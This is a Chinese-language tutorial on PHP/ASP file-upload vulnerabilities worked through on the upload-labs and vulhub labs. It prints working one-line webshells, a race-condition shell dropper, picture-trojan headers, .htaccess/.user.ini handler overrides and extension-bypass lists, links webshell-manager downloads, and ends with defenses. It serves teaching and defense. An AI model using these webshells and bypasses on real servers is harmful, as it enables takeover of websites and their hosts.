## 文件上传漏洞

> 创建: 未知 | 更新: 2026-05-21 | 适用: PHP通用 | ⚠️ 部分图片托管于外部CDN

> 漏洞概述

- 文件上传是Web应用的必备功能之一,比如上传头像显示个性化,上传附件共享文件,上传脚本更新网站等.如果服务器配置不当或者没有进行足够的过滤,Web用户就可以上传任意文件,包括恶意脚本文件,exe程序等,这就造成了文件上传漏洞

> 漏洞成因

- 文件上传漏洞的成因,一方面服务器配置不当会导致任意文件上传;另一方面,Web应用开放了文件上传功能,并且对上传的文件没有进行足够的限制;再者就是,程序开发部署时候,没有考虑到系统特性和验证和过滤不严格而导致限制被绕过,上传任意文件

> 漏洞危害

- 上传漏洞最直接的威胁就是上传任意文件,包括恶意脚本,程序等.如果Web服务器所保存上传文件的可写目录具有执行权限,那么就可以直接上传后门文件,导致网站沦陷.如果攻击者通过其他漏洞进行提权操作,拿到系统管理权限,那么直接导致服务器沦陷.同服务器下的其他网站无一幸免,均会被攻击者控制.通过上传漏洞获得的网站后门,就是WebShell

> WebShell

- 在计算机科学中,Shell俗称壳(用来区别于"核"),是指"为使用者提供操作界面"的软件(命令解释器).类似于windows系统给的cmd.exe或者linux下bash等,虽然这些系统上的命令解释器不止一种
- WebShell是一个网站的后门,也是一个命令解释器,不过是以Web方式(HTTP协议)通信(传递命令消息),继承了Web用户的权限.WebShell本质上是在服务器端可运行的脚本文件,后缀名为.php/.asp/.aspx/.jsp 等,也就是说WebShell接收来自于Web用户的命令,然后再服务器端执行

> 大马

- WebShell也可以是大马,也是网站木马.有一类WebShell之所以叫大马,是因为与小马(一句话木马)区分开,并且代码比较大,但是功能比较丰富.同样,大马有很多种脚本格式,其功能基本相同.每个团队都有自己的定制大马.以下是一个简单的例子.输入密码,密码一般直接写在木马文件中

> 小马

- 小马就是一句话木马,因为其代码量比较小,就是一句简单的代码.以下是各个脚本的一句话
- 一句话木马短小精悍,功能强大,但是需要配合中国菜刀或者中国蚁剑客户端使用,中国菜刀是一句话木马的管理器,也是命令操作接口.中国菜刀在连接一句话木马的时候需要填写密码(实际上就是变量名).例如,我们上传一个php的一句话木马,密码就是`cmd`

------

- ASP

```
<%eval request("cmd")%>
```

- ASP.NET

```
<%@ Page Language="Jscript"%>
<%eval(Request.Item["cmd"],"unsafe");%>
```

- PHP

```
<?php @eval($_REQUEST['cmd']);?>
```

- 中国菜刀与一句话木马配合实现了三大基本功能

1. 在中国菜刀页面继承Web用户权限可以实现文件管理,包括文件查看,上传,下载,修改,删除甚至运行程序
2. 在中国菜刀下可以获得类似于cmd和bash的命令行接口,可以执行相关命令
3. 我们可以使用中国菜刀进行数据库管理,此时需要知道连接数据库的账密

## 文件上传漏洞利用的条件

> 用到的工具和测试代码

- [中国菜刀.rar](https://blog.1997sty.com/cos/uploads/20201223/a0cb765a84e387e4a173cf3d5ad7940a.rar?sign=1739086314-9b5539cb77621949e076e5524ddb3e88-0-e59264fcd00a7d8eeed5f8f9035b5735)
- [upload-labs-master.zip](https://blog.1997sty.com/cos/uploads/20201223/e200b731402b4e1c9c3d064410eec6ba.zip?sign=1739086314-7b72fd86493168b657c6a5b910e05487-0-648daac4e1388916f84828187348a076)
- [upload-labs-env-win-0.1.rar](https://blog.1997sty.com/cos/uploads/20201223/23b328ca582e0cf7651cb84b72cdc358.rar?sign=1739086314-7b8836d7c551330af6f81f8b3977a1ac-0-602c4d00c9d97c617956af9d4df6ccf7)
- [php大马.zip](https://blog.1997sty.com/cos/uploads/20201224/5a19381fe349f066e3c099c93b8ecf5c.zip?sign=1739086314-ea5f039d2b4b348451ed4eafc88c7fe1-0-0c3a3d3d80331ad0523df78d9a1233a3)
- [asp,aspx大马.rar](https://blog.1997sty.com/cos/uploads/20201230/8446ea4caaae361412c44fb47547c7c6.rar?sign=1739086314-e95cdc0700c94fd7c1eef820b752ea3f-0-4d68f36c4d7acb8380575348f6a07007)
- [GitHub中国蚁剑](https://github.com/AntSwordProject/AntSword-Loader)

> 中国蚁剑需要使用加载器配合源码一起使用

- [antSword-master.zip](https://blog.1997sty.com/cos/uploads/20201224/3f55d38d52272d463ebef987d2140248.zip?sign=1739086314-a372cd701299f24a0760caa69dc85ab7-0-31c07b37761e64266e2e32e446cb8abb)
- [AntSword-Loader-v4.0.3-win32-x64.zip](https://blog.1997sty.com/cos/uploads/20201224/0248e575cd10a677a00d5800a049d62a.zip?sign=1739086314-6b82c8b4807d80b0b3c7766bd5698f12-0-7c3078f19dd6050af9c9e7f9eb55993a)

1. Web服务器要开启文件上传功能,并且上传api(接口)对外开放(Web用户可以访问)
2. Web用户对目标目录具有可写权限,甚至具有执行权限,一般情况下,Web目录都有执行权限.
3. 要想完美利用文件上传漏洞,就是上传的文件可以执行,也就是Web容器可以解析我们上传的脚本,无论脚本以什么样的形式存在.
4. 无视以上条件的情况就是服务器配置不当,开启了PUT方法

### 黑白名单策略

> 黑白名单是最常用的安全策略之一.在计算机安全中,黑白名单类似于一个列表,列表中写了一些条件或规则,如果在黑名单中,一律禁止,如果在白名单中,一律允许

### PUT方法上传文件

> HTTP请求方法之一,允许向服务器直接写入文件

- 测试Apache是否开启了put方法

```
telnet 172.16.132.161 80

OPTIONS / HTTP/1.1
HOST:172.16.132.161
```

- apache开启put方法操作

```
httpd.conf

;开启模块
LoadModule dav_module modules/mod_dav.so
LoadModule dav_fs_module modules/mod_dav_fs.so

;启用模块
<Directory />
    Options +Indexes +FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
    DAV On
</Directory>

开启文件锁
DavLockDB c:\phpstudy\www\DavLock
```

- 上传文件

```
telnet 172.16.132.161 80

PUT /info.php HTTP/1.1
HOST: 172.16.132.161
Content-Length: 18

<?php phpinfo();?>
```

### 前端限制与绕过

> 有些Web应用的文件上传功能,仅在前端用JS脚本做了检测,如检测文件后缀名等.upload-labs第一关,以下是经典的代码

```
<script type="text/javascript">
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传,请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
</script>
```

[![QQ截图20201223152000.png](https://blog.1997sty.com/cos/uploads/20201223/08ab7cbc8b1369a7688a5825e7eda16a.png?sign=1739086314-0e4f0b727b464c39a37e732208a78d11-0-3e286f403595936884845d7c78387ae0)](https://blog.1997sty.com/cos/uploads/20201223/08ab7cbc8b1369a7688a5825e7eda16a.png?sign=1739086314-0e4f0b727b464c39a37e732208a78d11-0-3e286f403595936884845d7c78387ae0)

- 此段JS代码采用白名单策略,检测文件后缀名.配合表单事件使用

```
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
                <p>请选择要上传的图片：</p><p>
                <input class="input_file" type="file" name="upload_file">
                <input class="button" type="submit" name="submit" value="上传">
            </p>
</form>
```

[![QQ截图20201223152114.png](https://blog.1997sty.com/cos/uploads/20201223/74c7754dd4ff5e53aa30ec2cdd7b7aa2.png?sign=1739086314-e0c76e3e34c214e3c7fb677158ab31db-0-fc0949109535c6f0a68645b3ab188ee5)](https://blog.1997sty.com/cos/uploads/20201223/74c7754dd4ff5e53aa30ec2cdd7b7aa2.png?sign=1739086314-e0c76e3e34c214e3c7fb677158ab31db-0-fc0949109535c6f0a68645b3ab188ee5)

- 前端JS脚本检测的安全防御是十分薄弱的.可以非常轻松的绕过
- 方法一:因为JS脚本的运行环境是浏览器,我们可以修改JS代码,甚至删除表单事件
- 方法二:使恶意文件后缀名符合白名单策略,用Burp挂代理抓包,然后修改文件后缀名即可
- 对于文件上传,一般在服务器端检测,采用黑白名单策略

### 服务器端检测MIME类型

> MIME(Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准.MIME 消息能包含文本,图像,音频,视频以及其他应用程序专用的数据

- 常见的MIME类型

| 文件扩展名 | Mime-Type                |
| :--------- | :----------------------- |
| .js        | application/x-javascript |
| .html      | text/html                |
| .jpg       | image/jpeg               |
| .png       | image/png                |
| .pdf       | application/pdf          |

> 在HTTP协议中,使用Content-Type字段表示文件的MIME类型.当我们上传文件的时候,抓到HTTP数据包.由于服务器在检测Content-Type类型的时候,取得的变量来自于用户,所以可以用Burp抓包,修改这个字段,使其合法,即可绕过限制上传任意文件

[![QQ截图20201223153705.png](https://blog.1997sty.com/cos/uploads/20201223/1fba96be6e73c5dc1d1c082b1a67b5fa.png?sign=1739086314-b2d859131caece8a09e196469720cbfd-0-54051e243aedbd0d94b46d7ec784ee67)](https://blog.1997sty.com/cos/uploads/20201223/1fba96be6e73c5dc1d1c082b1a67b5fa.png?sign=1739086314-b2d859131caece8a09e196469720cbfd-0-54051e243aedbd0d94b46d7ec784ee67)

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

### 服务器端检测文件内容

> 除了检测上传文件的Content-Type类型,为了保持安全性,服务器端还会检测文件内容.PHP中有一个函数`getimagesize()`,这个函数本意是检查图片的大小,但是在检查之前,该函数会判断目标文件是否是一张图片.因此,可以用该函数来检测文件的内容

```
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}
```

- 对于文件内容检测,我们可以通过制作上传图片木马绕过
- 将以下十六进制转换为字符串写入文件首行,之后写入一句话木马绕过内容检测
- 将代码上传到服务器后虽然不可以直接执行,但可以配合其他漏洞去执行

| 类型 | 开头十六进制编码                                |
| :--- | :---------------------------------------------- |
| png  | 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 |
| jpg  | FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C |
| gif  | 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33 |

### 服务器端检测后缀名

> 服务器端还会检测文件后缀名,依然会采用黑白名单策略.黑名单策略,不允许上传`php`,`asp`,`aspx`,`jsp`等可执行脚本的文件;白名单策略,只允许上传`jpg`,`gif`,`png`,`doc`,`rar`等格式的文件

- 黑名单

> 对于黑名单,我们可以寻找其他可允许上传的类型来绕过限制

- **php** : `.php`,`.php2`,`.php3`,`.php5`,`.phtml`
- **asp** : `.asp`,`.aspx`,`.ascx`,`.ashx`,`.asa`,`.cer`
- **jsp** : `.jsp`,`.jspx`
- 白名单

> 对于后缀名白名单策略,我们只能上传在白名单内的文件后缀名

### 空字符截断

> `00`就是`Null`,表示空字符,URL中表现为`%00`,在c语言中,一个字符串以`\0`作为结束的标记,由于php的底层就是c语言,所以php也继承了这个特性,空字符截断会导致文件上传路径截断

```
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        }
        else{
            $msg = '上传失败！';
        }
    }
    else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

[![QQ截图20201224094136.png](https://blog.1997sty.com/cos/uploads/20201224/75d4b9463555ffdf495e5fcdfffb96d3.png?sign=1739086314-27d8c57bb116435143486d5692f7177d-0-25848af3bc6f66fe64dca31b5d03b260)](https://blog.1997sty.com/cos/uploads/20201224/75d4b9463555ffdf495e5fcdfffb96d3.png?sign=1739086314-27d8c57bb116435143486d5692f7177d-0-25848af3bc6f66fe64dca31b5d03b260)

[![QQ截图20201224094252.png](https://blog.1997sty.com/cos/uploads/20201224/413b2aed1eaecca55e10123a019acffd.png?sign=1739086314-5a8c6182620a02c08075a306f6ff3e65-0-3c5a88931feb9cebd21cba2a74e17c5f)](https://blog.1997sty.com/cos/uploads/20201224/413b2aed1eaecca55e10123a019acffd.png?sign=1739086314-5a8c6182620a02c08075a306f6ff3e65-0-3c5a88931feb9cebd21cba2a74e17c5f)

### .htaccess攻击

> `.htaccess`是服务器的分布式配置文件,该配置文件会覆盖服务器的全局配置,作用域是当前目录及其子目录.如果一个Web应用允许上传`.htaccess`文件,那就意味着攻击者可以更改服务器的配置,这是十分危险

#### 将`.png`文件当作PHP文件解析

> 将以下代码写入`.htaccess`文件,放到测试目录下

```
# define width 16
# define height 7
AddType application/x-httpd-php .png
```

> 在该目录下打开`.png`文件`将会被当作PHP文件解析

[![QQ截图20201224095259.png](https://blog.1997sty.com/cos/uploads/20201224/6721786925c48de16caf802928a68fc2.png?sign=1739086314-c47ba6e3b0393fd398381a1f166aa19e-0-09002dc514e3931974ee3ed152b3e76d)](https://blog.1997sty.com/cos/uploads/20201224/6721786925c48de16caf802928a68fc2.png?sign=1739086314-c47ba6e3b0393fd398381a1f166aa19e-0-09002dc514e3931974ee3ed152b3e76d)

#### 文件名中包含php关键字

> 当文件名`muma.php.png`中包含关键字`.php`,并且`.htaccess`文件内容如下,`info.php.png`中的代码会被执行

```
AddHandler php5-script php
```

[![QQ截图20201224095651.png](https://blog.1997sty.com/cos/uploads/20201224/c055dcd49d669eaa2b40f9c6e1dd0208.png?sign=1739086314-c7f63d48b3bd2f8cbdf918de148e4c4b-0-6cee1479cfc4ae5732f467777f357300)](https://blog.1997sty.com/cos/uploads/20201224/c055dcd49d669eaa2b40f9c6e1dd0208.png?sign=1739086314-c7f63d48b3bd2f8cbdf918de148e4c4b-0-6cee1479cfc4ae5732f467777f357300)

#### 匹配文件名

> 以下配置是匹配文件名`1997sty`匹配该文件名,并执行其中的PHP代码

```
<FilesMatch "1997sty">
SetHandler application/x-httpd-php
</FilesMatch>
```

[![QQ截图20201224095929.png](https://blog.1997sty.com/cos/uploads/20201224/c5e61c832b29b6255860c9be9dcd8a8a.png?sign=1739086314-6b2751c133a67dccfc0bd9a28896467b-0-4ef5b3c5889f6dd2720cbcbe14dfc9fd)](https://blog.1997sty.com/cos/uploads/20201224/c5e61c832b29b6255860c9be9dcd8a8a.png?sign=1739086314-6b2751c133a67dccfc0bd9a28896467b-0-4ef5b3c5889f6dd2720cbcbe14dfc9fd)

#### upload-labs上传.htaccess

> 绕开所有的黑名单后缀,通过`.htaccess`来运行php代码

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

[![QQ截图20201224100115.png](https://blog.1997sty.com/cos/uploads/20201224/299951d1ba059531271b99b6af53f8bc.png?sign=1739086314-d98b5c4e0f4682b2e8450fcb90be0c85-0-2e97413b3329f1ab4708c659a00c7bca)](https://blog.1997sty.com/cos/uploads/20201224/299951d1ba059531271b99b6af53f8bc.png?sign=1739086314-d98b5c4e0f4682b2e8450fcb90be0c85-0-2e97413b3329f1ab4708c659a00c7bca)

[![QQ截图20201224100103.png](https://blog.1997sty.com/cos/uploads/20201224/76fd959be19282751857f37cf60edab0.png?sign=1739086314-05b328625d772b88011b88c37669b034-0-8c62a0c2be837b057d7c2602e461871f)](https://blog.1997sty.com/cos/uploads/20201224/76fd959be19282751857f37cf60edab0.png?sign=1739086314-05b328625d772b88011b88c37669b034-0-8c62a0c2be837b057d7c2602e461871f)

### Web容器解析漏洞

> Web容器解析漏洞,就是Web容器在解析脚本出现的bug

#### Apache解析漏洞

> Apache在判断文件后缀时,会从右向左一次获取后缀,直到获取到认识的后缀,如果对文件名加以修改,文件上传后可以骗过服务器执行php代码

[![QQ截图20201224100947.png](https://blog.1997sty.com/cos/uploads/20201224/2a85afbc0d347da2abda35511facb078.png?sign=1739086314-0882a177151acfebb8eb8ea6670d24ce-0-8774c963fad6b2f1c3e83038ea63983c)](https://blog.1997sty.com/cos/uploads/20201224/2a85afbc0d347da2abda35511facb078.png?sign=1739086314-0882a177151acfebb8eb8ea6670d24ce-0-8774c963fad6b2f1c3e83038ea63983c)

#### IIS6.0解析漏洞

> iis使用`;`隔断文件名,骗过服务器执行代码

[![QQ截图20201224101147.png](https://blog.1997sty.com/static/img/loading.gif)](https://blog.1997sty.com/cos/uploads/20201224/03e353ac6028f219bff6e2cd42fe20d4.png?sign=1739086314-60941973bfd9d33d4a2be06f228def07-0-21f5180228219bf04ce4bce71fcc299b)

> iis使用目录来生成后缀,骗过服务器执行代码

[![QQ截图20201224105550.png](https://blog.1997sty.com/cos/uploads/20201224/fcbf3ddfb73e3ecd5cfa8f962722d393.png?sign=1739086314-7d97f9d846d3ffc6e0a1382c0c8eda15-0-6d5abd5dfb4a2c9bb000554f203923f9)](https://blog.1997sty.com/cos/uploads/20201224/fcbf3ddfb73e3ecd5cfa8f962722d393.png?sign=1739086314-7d97f9d846d3ffc6e0a1382c0c8eda15-0-6d5abd5dfb4a2c9bb000554f203923f9)

#### PHP CGI解析漏洞

> 漏洞环境为IIS7.0/7.5+PHP环境

- `http://localhost:8000/info.png/.php`
- `info.png`文件中是php代码,当访问url追加`/.php`,就会骗过服务器执行代码

[![QQ截图20201224110318.png](https://blog.1997sty.com/cos/uploads/20201224/874042ca06088a782dec34f1456aa0d4.png?sign=1739086314-e62335a981a5c4bb742209effde71899-0-d5da5c1a61ae10d11632344ce7f79415)](https://blog.1997sty.com/cos/uploads/20201224/874042ca06088a782dec34f1456aa0d4.png?sign=1739086314-e62335a981a5c4bb742209effde71899-0-d5da5c1a61ae10d11632344ce7f79415)

> 防御该漏洞只需要把请求限制中,映射限制为文件

[![QQ截图20201224110640.png](https://blog.1997sty.com/cos/uploads/20201224/9fc41e811003581b8cce0413b5301fb6.png?sign=1739086314-a69e8c4c0f2f89eae736f676ef19734b-0-80d720002a3a284db1e051f223c9e4f3)](https://blog.1997sty.com/cos/uploads/20201224/9fc41e811003581b8cce0413b5301fb6.png?sign=1739086314-a69e8c4c0f2f89eae736f676ef19734b-0-80d720002a3a284db1e051f223c9e4f3)

> 或者可以将php配置文件中`cgi.fix_pathinfo`参数的值改为0

[![QQ截图20201224111013.png](https://blog.1997sty.com/static/img/loading.gif)](https://blog.1997sty.com/cos/uploads/20201224/45ab2482d5c80388492b379137a6d45e.png?sign=1739086314-5e8a29df3278df98df0170da37ef9d1e-0-63b0372def68759da731d84c6fcef917)

#### Nginx 解析漏洞

- 环境搭建参考以下内容
- https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/
- [vulhub-master.zip](https://blog.1997sty.com/cos/uploads/20201224/2474ccd6a75d640ea1dda801c4faaa2a.zip?sign=1739086314-384ee3970743b1300343a4d046816df2-0-ecdac40706c798db633f9e9ce01d8a3a?sign=1739086314-b634db36e17dfa37ebda2e0208f3471e-0-f23bcd38b4b6d55e46daef8366ba19b7)
- 访问路径`/uploadfiles/nginx.png/.php`

[![QQ截图20201224112408.png](https://blog.1997sty.com/cos/uploads/20201224/9cd2aa45ef172abf7398bee9ec7902b4.png?sign=1739086314-138cca70ef64aac06d943eadb5182ab3-0-3512ca645613e15022847f8d8b9538b6)](https://blog.1997sty.com/cos/uploads/20201224/9cd2aa45ef172abf7398bee9ec7902b4.png?sign=1739086314-138cca70ef64aac06d943eadb5182ab3-0-3512ca645613e15022847f8d8b9538b6)

[![QQ截图20201224112419.png](https://blog.1997sty.com/cos/uploads/20201224/9261ef70f37cdf3338bc81945e105397.png?sign=1739086314-36de5dd45d3ed6f519348ba12e1c78f9-0-9e6d9b5dd542afda9252c738241f1154)](https://blog.1997sty.com/cos/uploads/20201224/9261ef70f37cdf3338bc81945e105397.png?sign=1739086314-36de5dd45d3ed6f519348ba12e1c78f9-0-9e6d9b5dd542afda9252c738241f1154)

#### Nginx空字节漏洞

> info.html文件内容

- 使用`%00`字符隔断路径,让nginx判断路径忽略后面的`.php`,在获取结尾部分的文件类型,让nginx解析为php文件

[![QQ截图20201224142305.png](https://blog.1997sty.com/cos/uploads/20201224/e8aefbf9592d153c25a693f2be98d081.png?sign=1739086314-58689ac4776b55645592e4177e02615a-0-b58577c06f3ed100353d7aa7b4d46357)](https://blog.1997sty.com/cos/uploads/20201224/e8aefbf9592d153c25a693f2be98d081.png?sign=1739086314-58689ac4776b55645592e4177e02615a-0-b58577c06f3ed100353d7aa7b4d46357)

[![QQ截图20201224142232.png](https://blog.1997sty.com/cos/uploads/20201224/138a96033c514eb6d7f9114a73a1c647.png?sign=1739086314-e43f16f901b84228f102e0b0847b0547-0-ee1f5ff1f5a670c5467074f941dc3fb8)](https://blog.1997sty.com/cos/uploads/20201224/138a96033c514eb6d7f9114a73a1c647.png?sign=1739086314-e43f16f901b84228f102e0b0847b0547-0-ee1f5ff1f5a670c5467074f941dc3fb8)

#### Nginx文件名逻辑漏洞

- 环境搭建参考以下内容
- https://vulhub.org/#/environments/nginx/CVE-2013-4547/
- [vulhub-master.zip](https://blog.1997sty.com/cos/uploads/20201224/2474ccd6a75d640ea1dda801c4faaa2a.zip?sign=1739086314-384ee3970743b1300343a4d046816df2-0-ecdac40706c798db633f9e9ce01d8a3a?sign=1739086314-b634db36e17dfa37ebda2e0208f3471e-0-f23bcd38b4b6d55e46daef8366ba19b7)

> 上传文件加入了1个空格`1.gif`

[![QQ截图20201224150149.png](https://blog.1997sty.com/cos/uploads/20201224/7ce45df1e58c364feb170f9d08c100ac.png?sign=1739086314-e3ab0bff2e8178ab2851fa6b61a3a407-0-93d373517e8d0bd36e7c3b7c4c7f5e07)](https://blog.1997sty.com/cos/uploads/20201224/7ce45df1e58c364feb170f9d08c100ac.png?sign=1739086314-e3ab0bff2e8178ab2851fa6b61a3a407-0-93d373517e8d0bd36e7c3b7c4c7f5e07)

> 成功上传图片木马

[![QQ截图20201224145620.png](https://blog.1997sty.com/cos/uploads/20201224/4fb5b1687c9a6c750593a0f1ed4874ff.png?sign=1739086314-c5ee965f13d441ed235befbece75038e-0-6712dd9cd6ed63564df2f845c583ca36)](https://blog.1997sty.com/cos/uploads/20201224/4fb5b1687c9a6c750593a0f1ed4874ff.png?sign=1739086314-c5ee965f13d441ed235befbece75038e-0-6712dd9cd6ed63564df2f845c583ca36)

> burp修改请求信息

[![QQ截图20201224150452.png](https://blog.1997sty.com/cos/uploads/20201224/1cfaca5f4298e41c17722374e4b72858.png?sign=1739086314-9b9f9a3e18dd0f5c44dbba37d8161182-0-b91f057b0a72988ff78f811340f33ed8)](https://blog.1997sty.com/cos/uploads/20201224/1cfaca5f4298e41c17722374e4b72858.png?sign=1739086314-9b9f9a3e18dd0f5c44dbba37d8161182-0-b91f057b0a72988ff78f811340f33ed8)

[![QQ截图20201224150515.png](https://blog.1997sty.com/cos/uploads/20201224/7e21d542a94f86d9189039198597b298.png?sign=1739086314-8bd3ab6a5a28f7eaa34e43211488a833-0-bb5a962c1ae7eeba3be8fa416ad3be30)](https://blog.1997sty.com/cos/uploads/20201224/7e21d542a94f86d9189039198597b298.png?sign=1739086314-8bd3ab6a5a28f7eaa34e43211488a833-0-bb5a962c1ae7eeba3be8fa416ad3be30)

## 漏洞防御

> 关于文件上传的防御,防住危险的脚本类型是最基本的防御,最理想的是能够过滤掉图片马中的恶意代码.如果一个Web应用能够上传图片木马,那么我们认为这个Web应用是不安全的

### 代码角度

1. 采用白名单策略,严格限制上传文件的后缀名.
2. 进行二次渲染,过滤掉图片马中的恶意代码.
3. 上传文件重命名,尽量少的从客户端获取信息.
4. 避免文件包含漏洞.
5. 严格处理文件路径,防御`00`截断漏洞,避开空格,`.`,`::$DATA`等windows特性

### 服务器角度

1. 及时更新Web容器,防止解析漏洞的产生
2. 可写目录不给执行权限

## 文件上传漏洞利用条件

- 上传的文件能被WEB服务器当做脚本执行
- 能访问上传文件(知道上传文件路径且能访问)

## 服务器上传文件命名规则

- 上传文件名和服务器文件名一致
- 上传文件名和服务器名不一致(随机，时间戳等)，但后缀一致
- 上传文件名和服务器名不一致(随机，时间戳等)，后缀也不一样

## 漏洞成因

由于开发者对用户上传的文件控制不足或者处理缺陷，从而导致用户可以越过其自身权限向服务器上传可执行的动态脚本。

## 漏洞利用

文件上传漏洞我们一般会上传一句话木马，使用菜刀或者蚁剑连接getshell。

问题：

- 文件能上传待到服务器
- 脚本文件可呗服务器解析，执行，通常会结合文件包含和文件解析漏洞。

## 文件上传过滤及绕过方法

#### 1.客户端检测

- 特点：前端检测，在点击上传的时，客户端没有向服务器发送任何消息之前，就提示上传文件非法
- 绕过方法：
  - 禁用浏览器JavaScript脚本
  - 先改成合法后缀名，在发送过程中截包，修改会正常后缀

#### 2.Content-Type检测文件类型

- 原理：服务器对HTTP报头中的Content-Type字段进行检测

- 绕过方法：使用截包工具对Content-Type字段进行修改

  #### 3.文件内容检测

- 原理：使用一些函数或其他方法检测文件内容特征

- 绕过方法：截包之后添加伪造的文件头或直接制作图片马

#### 4.后缀黑名单

- 原理：利用正则表达式，过滤上传的文件后缀名，在黑名单之中的文件后缀不允许上传

- 绕过方法：

  - 利用黑名单的漏网之鱼，利用操作系统文件命名规则，利用Web服务组件解析漏洞

    1.大小写混用`pHp`、`aSp`之类（Linux下也可用）

    2.如果服务器是windows，可以利用windows特性，windows会自动去掉不符合命名规则后缀的后缀名

    ```
    test.asp.
        
    test.asp(空格)
        
    test.php.
        
    test.php 
        
    test.php::$DATA
    ```

    3.能被解析的不常见拓展名

    ```
    jsp：jspx、jspf、jsps
    asp：asa、cer、aspx、cdx、ashx、htr、asax
    php：php3、php4、php5、php7、phpt、phtml
        
    ```

    4.配合文件包含

    上传包含木马的文件，使用文件包含，执行其中脚本

    5.条件竞争

    ```
    1.首先上传一个写Shell的php
    <?php fputs(fopen('shell.php',w),'<?php @eval($_POST["cmd"]);?>');?>，
    while1循环访问该文件，持续上传，直到竞争完成文件创建。
         
    2.循环上传一句话，持续尝试访问该页面。
    ```

    6.00截断

    ```
    两种情况：一种是%00，一种是0x00
    前者用在GET传参，%00作为URL会被URL解码，对应的是\0
    后者用于POST，POST传送的字符不会经过URL解码，所以需要将其改为十六进制的0x00
    00截断的目的在于，（php基于C）当PHP中的函数将\0视为字符串的终止，因此只有当文件名变量可控并且不会进行去空字符操作的时候，同时有函数调用这个字符串的时候才有效。
    ```

    7.配置文件

    - **1.httpd.conf**

     如果其中包含`AddHandler php5-script .php`只要文件名 中包含.php就会以php文件执行

     如果其中包含`AddType application/x-httpd-php .jpg`即使文件扩展为`.jpg`也会按照php执行，该选项是与类型表相关的，描述的是扩展名与文件类型之间的关系，在客户端与服务端协商的时候，客户端会描述需要什么类型的字段，服务端调取相应后缀名的文件。

    - **2.htaccess**

      作用于当前目录及其子目录的配置文件

    - **3.user.ini**

      通过`.user.ini` 绕过文件上传过滤（或者说叫解析漏洞），与`.htaccess`文件利用类似，但是`user.ini`文件和htaccess相比：**在修改后不用重启服务器**，只需要等待刷新时间即可

      在上传的`.user.ini`文件中写入`auto_prepend_file=01.gif`这样就可以在该目录下的所有php文件中包含`01.gif`

## **以下以upload-labs演示**

### 1.前端脚本检测拓展名

```
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

可以看出此为典型的前端文件后缀名判断，为白名单判断，，只允许上传后缀为.jpg .png .gif 的文件。但前端过滤，我们可以直接注释掉前端js代码，或者删除触发条件，或者使用burpsuit抓 包进行修改。上传服务器可执行的脚本文件，进行getshell。

